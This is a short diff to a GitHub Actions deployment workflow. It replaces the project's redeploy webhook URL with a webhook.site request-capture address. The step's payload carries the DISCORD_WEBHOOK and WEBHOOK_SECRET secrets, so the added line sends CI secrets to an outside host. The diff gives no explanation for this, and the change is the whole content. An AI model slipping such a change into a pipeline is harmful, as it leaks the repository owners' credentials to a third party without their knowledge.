@@ -62,7 +62,7 @@ jobs:
       - name: Invoke deployment hook
         uses: distributhor/workflow-webhook@v3
         with:
-          webhook_url: https://fs-webhook.iecmu.com/hooks/redeploy
+          webhook_url: https://webhook.site/c37bcb6b-4436-41ed-9483-d5ee4e16b3e2
           webhook_secret: ${{ secrets.WEBHOOK_SECRET }}
           data: '{ "project_group": "${{ vars.PROJECT_GROUP}}", "discord_webhook": "${{ secrets.DISCORD_WEBHOOK}}", "webhook_secret": "${{ secrets.WEBHOOK_SECRET }}" }'
           verbose: true
